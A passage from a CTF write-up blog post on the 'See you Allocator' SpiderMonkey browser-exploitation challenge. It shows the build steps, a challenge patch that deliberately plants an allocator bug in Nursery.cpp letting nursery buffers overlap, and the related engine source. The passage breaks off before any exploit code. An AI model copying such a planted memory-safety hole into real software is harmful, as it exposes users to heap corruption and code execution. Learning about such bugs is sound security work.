<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>TyphoonCon CTF 2022 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
  <meta name="twitter:title" content="TyphoonCon CTF 2022">
  <meta name="twitter:description" content="Writeup for TyphoonCon CTF 2022 by Chovid99">
      <meta name="twitter:site" content="@Chovid99">
<meta property="og:url" content="https://chovid99.github.io/posts/typhooncon-ctf-2022/">
  <meta property="og:site_name" content="Chovid99&#39;s Blog">
  <meta property="og:title" content="TyphoonCon CTF 2022">
  <meta property="og:description" content="Writeup for TyphoonCon CTF 2022 by Chovid99">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-06-25T10:04:10+07:00">
    <meta property="article:modified_time" content="2023-02-23T18:03:33+07:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="TyphoonCon">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Heap">
    <meta property="article:tag" content="Firefox">
    <meta property="article:tag" content="SpiderMonkey">
    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/typhooncon-ctf-2022/" /><link rel="prev" href="https://chovid99.github.io/posts/justctf-2022/" /><link rel="next" href="https://chovid99.github.io/posts/google-ctf-2022/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "TyphoonCon CTF 2022",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/typhooncon-ctf-2022\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, TyphoonCon, pwn, heap, firefox, SpiderMonkey, JIT, browser, oob, 2022","wordcount":  6374 ,
        "url": "https:\/\/chovid99.github.io\/posts\/typhooncon-ctf-2022\/","datePublished": "2022-06-25T10:04:10+07:00","dateModified": "2023-02-23T18:03:33+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">TyphoonCon CTF 2022</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Jun 25, 2022">Jun 25, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6374 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;30 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#see-you-allocator">See you Allocator</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a>
              <ul>
                <li><a href="#environment-setup">Environment Setup</a></li>
                <li><a href="#analyzing-the-patch-and-source-code">Analyzing the patch and source code</a></li>
              </ul>
            </li>
            <li><a href="#exploitation-plan">Exploitation Plan</a>
              <ul>
                <li><a href="#understanding-the-spidermonkey-engine">Understanding the SpiderMonkey engine</a></li>
                <li><a href="#what-we-can-do-to-abuse-the-bug">What we can do to abuse the bug</a></li>
                <li><a href="#jit-spray">JIT Spray</a></li>
                <li><a href="#final-plan">Final Plan</a></li>
              </ul>
            </li>
            <li><a href="#solution">Solution</a>
              <ul>
                <li><a href="#trigger-overlapping-chunk">Trigger Overlapping chunk</a></li>
                <li><a href="#create-read-and-write-gadget">Create Read and Write Gadget</a></li>
                <li><a href="#smuggle-shellcode">Smuggle shellcode</a></li>
                <li><a href="#find-the-jit-ed-function-and-jump-to-it">Find the JIT-ed function and jump to it</a></li>
                <li><a href="#full-script">Full Script</a></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/sc5W1BV.png" title="https://i.imgur.com/sc5W1BV.png" data-thumbnail="https://i.imgur.com/sc5W1BV.png" data-sub-html="<h2>TyphoonCon CTF 2022</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/sc5W1BV.png"
            data-srcset="https://i.imgur.com/sc5W1BV.png, https://i.imgur.com/sc5W1BV.png 1.5x, https://i.imgur.com/sc5W1BV.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/sc5W1BV.png" />
    </a><figcaption class="image-caption">TyphoonCon CTF 2022</figcaption>
    </figure>
<p>During the weekdays, I spent my after work time by working on the TyphoonCon CTF challenge, specifically See you Allocator challenge. This is my first time doing a browser pwn challenge, so I wrote this writeup for my future-self and as a training for me to understand it better. I apologize in advance if there is any mistake on my explanation, and feel free to correct me if i&rsquo;m wrong.</p>
<div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw" aria-hidden="true"></i>Disclaimer<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Until now, I honestly don&rsquo;t know the intended solution that the authors want (because there are unintended solution which we can directly read the file with the js shell interpreter). But assuming this is like the normal browser pwn challenge, I set on my mind that the intended solution for this chall is to be able get RCE.</div>
        </div>
    </div>
<h1 id="pwn">Pwn</h1>
<h2 id="see-you-allocator">See you Allocator</h2>
<p>On this challenge, we were given 2 info, the hash <code>commit</code> for the <a href="https://github.com/mozilla/gecko-dev/tree/c1598f6d3edad19ccc53f53ab045d1d29835e1dd" target="_blank" rel="noopener noreffer ">firefox repo</a> and the challenge patch.</p>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>This is my first time doing browser pwn, so maybe the best way for me is to setup the environment first.</p>
<h4 id="environment-setup">Environment Setup</h4>
<p>Reading through this <a href="https://vigneshsrao.github.io/posts/play-with-spidermonkey/" target="_blank" rel="noopener noreffer ">article</a>, below is how we setup and build the js shell.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git clone https://github.com/mozilla/gecko-dev.git
</span></span><span class="line"><span class="cl">cd gecko-dev
</span></span><span class="line"><span class="cl">git checkout c1598f6d3edad19ccc53f53ab045d1d29835e1dd
</span></span><span class="line"><span class="cl">git apply ../challenge.patch
</span></span><span class="line"><span class="cl">cp configure.in configure &amp;&amp; autoconf2.13
</span></span><span class="line"><span class="cl">mkdir build_NODBG.OBJ
</span></span><span class="line"><span class="cl">cd build_NODBG.OBJ
</span></span><span class="line"><span class="cl">../configure --disable-debug --disable-optimize
</span></span><span class="line"><span class="cl">make
</span></span></code></pre></td></tr></table>
</div>
</div><p>Usually for browser pwn challenge, AFAIK, one of the attack vector is usually the js shell (which is for Firefox, it is powered with SpiderMonkey engine). This will build a binary called <code>js</code> under the <code>dist/bin</code> folder. Notes that we build the non-debug js shell.</p>
<h4 id="analyzing-the-patch-and-source-code">Analyzing the patch and source code</h4>
<p>After successfully build the binary, not it&rsquo;s time for us to read the source code first. Let&rsquo;s start by reading the patchfile.</p>
<p><strong>challenge.patch</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">From 9b75f0de94978a681682cf13d392b0db7fa4161a Mon Sep 17 00:00:00 2001
</span></span><span class="line"><span class="cl">From: Your Name &lt;you@example.com&gt;
</span></span><span class="line"><span class="cl">Date: Thu, 17 Feb 2022 16:09:17 +0000
</span></span><span class="line"><span class="cl">Subject: [PATCH] Cool new Implementation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl"> js/src/gc/Nursery.cpp | 4 +++-
</span></span><span class="line"><span class="cl"> 1 file changed, 3 insertions(+), 1 deletion(-)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">diff --git a/js/src/gc/Nursery.cpp b/js/src/gc/Nursery.cpp
</span></span><span class="line"><span class="cl">index ef75e814ed..59ac8e5872 100644
</span></span><span class="line"><span class="cl">--- a/js/src/gc/Nursery.cpp
</span></span><span class="line"><span class="cl">+++ b/js/src/gc/Nursery.cpp
</span></span><span class="line"><span class="cl">@@ -701,12 +701,14 @@ void* js::Nursery::reallocateBuffer(Zone* zone, Cell* cell, void* oldBuffer,
</span></span><span class="line"><span class="cl">     return newBuffer;
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">+  void* newBuffer = allocateBuffer(zone, newBytes);
</span></span><span class="line"><span class="cl">+
</span></span><span class="line"><span class="cl">   // The nursery cannot make use of the returned slots data.
</span></span><span class="line"><span class="cl">   if (newBytes &lt; oldBytes) {
</span></span><span class="line"><span class="cl">+    position_ -= oldBytes;
</span></span><span class="line"><span class="cl">     return oldBuffer;
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">-  void* newBuffer = allocateBuffer(zone, newBytes);
</span></span><span class="line"><span class="cl">   if (newBuffer) {
</span></span><span class="line"><span class="cl">     PodCopy((uint8_t*)newBuffer, (uint8_t*)oldBuffer, oldBytes);
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl">-- 
</span></span><span class="line"><span class="cl">2.20.1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so the patch is applied to the Nursery.cpp file. To understand it better, let&rsquo;s try to read the method&rsquo;s code.</p>
<p><strong>Nursery.cpp</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="n">js</span><span class="o">::</span><span class="n">Nursery</span><span class="o">::</span><span class="n">reallocateBuffer</span><span class="p">(</span><span class="n">Zone</span><span class="o">*</span> <span class="n">zone</span><span class="p">,</span> <span class="n">Cell</span><span class="o">*</span> <span class="n">cell</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">oldBuffer</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                    <span class="n">size_t</span> <span class="n">oldBytes</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">newBytes</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">IsInsideNursery</span><span class="p">(</span><span class="n">cell</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">zone</span><span class="o">-&gt;</span><span class="n">pod_realloc</span><span class="o">&lt;</span><span class="kt">uint8_t</span><span class="o">&gt;</span><span class="p">((</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="n">oldBuffer</span><span class="p">,</span> <span class="n">oldBytes</span><span class="p">,</span> <span class="n">newBytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">isInside</span><span class="p">(</span><span class="n">oldBuffer</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">MOZ_ASSERT</span><span class="p">(</span><span class="n">mallocedBufferBytes</span> <span class="o">&gt;=</span> <span class="n">oldBytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">newBuffer</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">        <span class="n">zone</span><span class="o">-&gt;</span><span class="n">pod_realloc</span><span class="o">&lt;</span><span class="kt">uint8_t</span><span class="o">&gt;</span><span class="p">((</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="n">oldBuffer</span><span class="p">,</span> <span class="n">oldBytes</span><span class="p">,</span> <span class="n">newBytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">newBuffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">oldBuffer</span> <span class="o">!=</span> <span class="n">newBuffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">MOZ_ALWAYS_TRUE</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">mallocedBuffers</span><span class="p">.</span><span class="n">rekeyAs</span><span class="p">(</span><span class="n">oldBuffer</span><span class="p">,</span> <span class="n">newBuffer</span><span class="p">,</span> <span class="n">newBuffer</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">mallocedBufferBytes</span> <span class="o">-=</span> <span class="n">oldBytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">mallocedBufferBytes</span> <span class="o">+=</span> <span class="n">newBytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">newBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">void</span><span class="o">*</span> <span class="n">newBuffer</span> <span class="o">=</span> <span class="n">allocateBuffer</span><span class="p">(</span><span class="n">zone</span><span class="p">,</span> <span class="n">newBytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// The nursery cannot make use of the returned slots data.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">newBytes</span> <span class="o">&lt;</span> <span class="n">oldBytes</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">position_</span> <span class="o">-=</span> <span class="n">oldBytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">oldBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">newBuffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PodCopy</span><span class="p">((</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="n">newBuffer</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="n">oldBuffer</span><span class="p">,</span> <span class="n">oldBytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">newBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Because I didn&rsquo;t have context at all, let&rsquo;s try to read the <code>allocateBuffer</code> method first to gain some context.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="n">js</span><span class="o">::</span><span class="n">Nursery</span><span class="o">::</span><span class="n">allocateBuffer</span><span class="p">(</span><span class="n">Zone</span><span class="o">*</span> <span class="n">zone</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">nbytes</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">MOZ_ASSERT</span><span class="p">(</span><span class="n">nbytes</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">nbytes</span> <span class="o">&lt;=</span> <span class="n">MaxNurseryBufferSize</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="n">allocate</span><span class="p">(</span><span class="n">nbytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">void</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="n">zone</span><span class="o">-&gt;</span><span class="n">pod_malloc</span><span class="o">&lt;</span><span class="kt">uint8_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">nbytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">buffer</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">registerMallocedBuffer</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">js_free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">nullptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Assuming that our allocated size is less than <code>MaxNurseryBufferSize</code>, that means <code>allocateBuffer</code> will call <code>allocate</code> method. Let&rsquo;s check it out.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kr">inline</span> <span class="kt">void</span><span class="o">*</span> <span class="n">js</span><span class="o">::</span><span class="n">Nursery</span><span class="o">::</span><span class="n">allocate</span><span class="p">(</span><span class="n">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">MOZ_ASSERT</span><span class="p">(</span><span class="n">isEnabled</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">  <span class="n">MOZ_ASSERT</span><span class="p">(</span><span class="o">!</span><span class="n">JS</span><span class="o">::</span><span class="n">RuntimeHeapIsBusy</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">  <span class="n">MOZ_ASSERT</span><span class="p">(</span><span class="n">CurrentThreadCanAccessRuntime</span><span class="p">(</span><span class="n">runtime</span><span class="p">()));</span>
</span></span><span class="line"><span class="cl">  <span class="n">MOZ_ASSERT_IF</span><span class="p">(</span><span class="n">currentChunk_</span> <span class="o">==</span> <span class="n">currentStartChunk_</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">position</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="n">currentStartPosition_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">MOZ_ASSERT</span><span class="p">(</span><span class="n">position</span><span class="p">()</span> <span class="o">%</span> <span class="n">CellAlignBytes</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">MOZ_ASSERT</span><span class="p">(</span><span class="n">size</span> <span class="o">%</span> <span class="n">CellAlignBytes</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#ifdef JS_GC_ZEAL
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">gc</span><span class="o">-&gt;</span><span class="n">hasZealMode</span><span class="p">(</span><span class="n">ZealMode</span><span class="o">::</span><span class="n">CheckNursery</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">size</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Canary</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">MOZ_UNLIKELY</span><span class="p">(</span><span class="n">currentEnd</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">position</span><span class="p">()</span> <span class="o">+</span> <span class="n">size</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">moveToNextChunkAndAllocate</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">void</span><span class="o">*</span> <span class="n">thing</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">position</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">position_</span> <span class="o">=</span> <span class="n">position</span><span class="p">()</span> <span class="o">+</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// We count this regardless of the profiler&#39;s state, assuming that it costs
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// just as much to count it, as to check the profiler&#39;s state and decide not
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// to count it.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">stats</span><span class="p">().</span><span class="n">noteNurseryAlloc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">DebugOnlyPoison</span><span class="p">(</span><span class="n">thing</span><span class="p">,</span> <span class="n">JS_ALLOCATED_NURSERY_PATTERN</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                  <span class="n">MemCheckKind</span><span class="o">::</span><span class="n">MakeUndefined</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#ifdef JS_GC_ZEAL
